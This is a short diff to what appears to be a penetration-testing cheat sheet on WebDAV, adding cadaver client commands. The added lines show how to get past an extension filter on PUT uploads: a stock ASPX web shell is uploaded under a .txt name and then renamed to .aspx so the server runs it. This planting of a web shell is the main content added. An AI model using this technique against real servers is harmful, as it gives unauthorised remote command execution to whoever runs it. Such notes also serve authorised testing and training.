@@ -241,6 +241,13 @@ Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hyperte
 ### Cadaver
     A command-line WebDAV client for Unix. 
     cadaver http://(target IP), then run “ls” to list directories found
+    ls
+    get file.txt
+    put local.txt distant.txt   
+
+    PUT can filtered on extension ex: .aspx
+    put /usr/share/webshells/aspx/cmdasp.aspx shell.txt
+    move shell.txt shell.aspx
 
 
 =============================================================
